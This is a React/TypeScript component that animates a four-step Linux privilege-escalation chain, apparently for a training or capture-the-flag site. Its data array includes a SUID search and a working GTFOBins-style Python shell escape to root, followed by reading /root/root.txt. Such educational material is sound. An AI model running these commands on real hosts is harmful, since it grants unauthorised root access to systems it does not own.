import { useState, useEffect } from 'react';
import { motion, AnimatePresence } from 'framer-motion';
import { Terminal } from 'lucide-react';

interface ChainStep {
  step: number;
  title: string;
  sublabel: string;
  command: string;
  output: string;
  explanation: string;
}

const PRIVESC_STEPS: ChainStep[] = [
  {
    step: 1,
    title: 'Standard Shell Enumeration',
    sublabel: 'User: www-data (UID 1001)',
    command: 'id && whoami',
    output: 'uid=1001(www-data) gid=1001(www-data) groups=1001(www-data)',
    explanation: 'Initial low-privilege access gained through web vulnerability (e.g. RCE or webshell).'
  },
  {
    step: 2,
    title: 'SUID & Sudo Audit Probe',
    sublabel: 'Permission Audit',
    command: 'find / -perm -4000 2>/dev/null',
    output: '/usr/bin/python3 (SUID Bit set for root ownership!)',
    explanation: 'System audit discovers binary executable configured with SUID bit permissions running as root.'
  },
  {
    step: 3,
    title: 'GTFOBins Binary Abuse Payload',
    sublabel: 'Payload Injection',
    command: 'python3 -c "import os; os.execl(\'/bin/sh\', \'sh\', \'-p\')"',
    output: '# whoami -> root (UID 0)',
    explanation: 'Abusing SUID Python executable to spawn an interactive subshell retaining root administrative privileges.'
  },
  {
    step: 4,
    title: 'Root Flag Capture',
    sublabel: 'Full System Compromise',
    command: 'cat /root/root.txt',
    output: 'CP{LINUX_PRIV_ESC_ROOT_MASTERED_2026}',
    explanation: 'Administrative control achieved. Target host fully compromised.'
  }
];

const easeOut: [number, number, number, number] = [0.4, 0, 0.2, 1];
const trans = { duration: 0.4, ease: easeOut };

export function PrivEscViz() {
  const [activeStepIdx, setActiveStepIdx] = useState<number>(0);
  const [isPlaying, setIsPlaying] = useState(false);
  const step = PRIVESC_STEPS[activeStepIdx];

  const runAutoPlay = () => {
    setIsPlaying(true);
    const startTime = performance.now();
    const duration = 2000;
    const tick = (now: number) => {
      const t = (now - startTime) / duration;
      if (t >= 1) {
        setActiveStepIdx(prev => (prev + 1) % PRIVESC_STEPS.length);
      } else {
        requestAnimationFrame(tick);
      }
    };
    requestAnimationFrame(tick);
  };

  useEffect(() => {
    if (isPlaying) {
      const timeout = setTimeout(runAutoPlay, 100);
      return () => clearTimeout(timeout);
    }
  }, [isPlaying, activeStepIdx]);

  return (
    <div className="space-y-5 font-mono select-none w-full">
      <div className="flex items-center justify-between gap-2 p-3 rounded-xl bg-[#F7F7F7] dark:bg-[#141414] border border-[#E5E5E5] dark:border-[#2A2A2A]">
        <div className="flex items-center gap-2 overflow-x-auto">
          <span className="text-xs font-bold text-[#888888] dark:text-[#777777] uppercase shrink-0">
            ATTACK CHAIN:
          </span>
          {PRIVESC_STEPS.map((s, idx) => {
            const isActive = activeStepIdx === idx;
            return (
              <button
                key={s.step}
                id={`privesc-step-${s.step}`}
                type="button"
                onClick={() => { setActiveStepIdx(idx); setIsPlaying(false); }}
                className={`px-3 py-1.5 rounded-lg text-xs font-bold uppercase transition-all duration-300 cursor-pointer border shrink-0 ${
                  isActive
                    ? 'bg-[#111111] dark:bg-white text-white dark:text-black border-[#111111] dark:border-white shadow-sm'
                    : 'bg-white dark:bg-[#1C1C1C] text-[#666666] dark:text-[#999999] border-[#E5E5E5] dark:border-[#2A2A2A] hover:border-[#111111] dark:hover:border-white'
                }`}
              >
                0{s.step}
              </button>
            );
          })}
        </div>

        <button
          id="privesc-toggle-play"
          type="button"
          onClick={() => setIsPlaying(!isPlaying)}
          className="p-2 rounded-lg bg-white dark:bg-[#1C1C1C] border border-[#E5E5E5] dark:border-[#2A2A2A] text-[#111111] dark:text-white hover:border-[#111111] dark:hover:border-white transition-colors duration-300 cursor-pointer"
        >
          {isPlaying ? '❚❚' : '▶'}
        </button>
      </div>

      <div className="relative rounded-2xl border border-[#E5E5E5] dark:border-[#2A2A2A] bg-white dark:bg-[#101010] p-6 flex flex-col justify-between overflow-hidden min-h-[300px] shadow-sm">
        <svg viewBox="0 0 540 240" aria-label="Privilege escalation chain" className="w-full max-h-[300px]">
          <line x1="30" y1="130" x2="510" y2="130" stroke="var(--border)" strokeWidth="2" strokeDasharray="6 6" />

          {PRIVESC_STEPS.map((s, idx) => {
            const isActive = activeStepIdx === idx;
            const isPast = idx < activeStepIdx;
            const x = 80 + idx * 120;
            return (
              <motion.g
                key={s.step}
                initial={{ opacity: 0, y: 10 }}
                animate={{ opacity: 1, y: 0 }}
                transition={{ ...trans, delay: idx * 0.1 }}
                style={{ cursor: 'pointer' }}
                onClick={() => { setActiveStepIdx(idx); setIsPlaying(false); }}
              >
                <motion.rect
                  x={x - 50} y="100" width="100" height="60" rx="8"
                  fill="var(--bg-card)"
                  stroke={isActive ? 'currentColor' : isPast ? 'var(--border)' : 'var(--border-bright)'}
                  strokeWidth={isActive ? 2.5 : isPast ? 1 : 1.5}
                  animate={{ stroke: isActive ? 'currentColor' : isPast ? 'var(--border)' : 'var(--border-bright)', strokeWidth: isActive ? 2.5 : isPast ? 1 : 1.5 }}
                  transition={trans}
                />
                <text x={x} y="125" textAnchor="middle" fontSize="9" fontFamily="monospace" fill="var(--text-muted)" fontWeight="800">
                  STEP 0{s.step}
                </text>
                <text x={x} y="142" textAnchor="middle" fontSize="10" fontFamily="monospace" fill="var(--text-primary)" fontWeight={isActive ? 900 : 600}>
                  {s.title.split(' ').slice(0, 2).join(' ')}
                </text>

                <AnimatePresence>
                  {isActive && (
                    <motion.g
                      initial={{ opacity: 0, y: 5 }}
                      animate={{ opacity: 1, y: 0 }}
                      transition={trans}
                    >
                      <rect x={x - 30} y="168" width="60" height="4" rx="2" fill="currentColor" opacity="0.9" />
                    </motion.g>
                  )}
                </AnimatePresence>

                {idx < PRIVESC_STEPS.length - 1 && (
                  <motion.line
                    x1={x + 50} y1="130" x2={x + 70} y2="130"
                    stroke="var(--border)"
                    strokeWidth="1.5"
                    animate={{ stroke: isPast ? 'var(--text-primary)' : 'var(--border)' }}
                    transition={trans}
                  />
                )}
              </motion.g>
            );
          })}

          <AnimatePresence mode="wait">
            <motion.g
              key={`status-${activeStepIdx}`}
              initial={{ opacity: 0, y: 5 }}
              animate={{ opacity: 1, y: 0 }}
              exit={{ opacity: 0, y: -5 }}
              transition={trans}
            >
              <rect x="120" y="200" width="300" height="24" rx="5" fill="var(--bg-card)" stroke="var(--border-bright)" strokeWidth="1.5" />
              <text x="270" y="217" textAnchor="middle" fontSize="9" fontFamily="monospace" fill="var(--text-primary)" fontWeight="700">
                {activeStepIdx === 3 ? '★ FULL ROOT PRIVILEGE ESCALATION COMPLETE' : `STAGES COMPLETED: ${activeStepIdx + 1} OF 4`}
              </text>
            </motion.g>
          </AnimatePresence>
        </svg>
      </div>

      <AnimatePresence mode="wait">
        <motion.div
          key={activeStepIdx}
          initial={{ opacity: 0, y: 8 }}
          animate={{ opacity: 1, y: 0 }}
          exit={{ opacity: 0, y: -8 }}
          transition={trans}
          className="p-5 rounded-xl border border-[#E5E5E5] dark:border-[#2A2A2A] bg-white dark:bg-[#141414] space-y-4 shadow-xs"
        >
          <div className="flex items-center justify-between border-b border-[#E5E5E5] dark:border-[#2A2A2A] pb-3">
            <div className="flex items-center gap-2.5">
              <Terminal size={16} />
              <span className="text-sm font-extrabold uppercase tracking-wide text-[#111111] dark:text-white font-heading">
                STAGE 0{step.step}: {step.title}
              </span>
            </div>
            <span className="text-xs font-bold text-[#888888] dark:text-[#777777] uppercase font-mono">
              {step.sublabel}
            </span>
          </div>

          <p className="text-xs sm:text-sm text-[#555555] dark:text-[#B5B5B5] font-sans leading-relaxed">
            {step.explanation}
          </p>

          <div className="p-3.5 rounded-lg bg-[#F7F7F7] dark:bg-[#181818] border border-[#E5E5E5] dark:border-[#2A2A2A] space-y-2 font-mono text-xs">
            <div className="flex items-center gap-2 text-[#888888]">
              <Terminal size={14} />
              <span className="text-[10px] font-bold uppercase">EXECUTED EXPLOIT PROBE</span>
            </div>
            <code className="block text-[#111111] dark:text-white font-bold text-xs bg-white dark:bg-black p-2.5 rounded-md border border-[#E5E5E5] dark:border-[#2A2A2A]">
              $ {step.command}
            </code>
            <code className="block text-xs text-[#333333] dark:text-[#B5B5B5] font-mono pt-1 font-bold">
              OUTPUT: {step.output}
            </code>
          </div>
        </motion.div>
      </AnimatePresence>
    </div>
  );
}
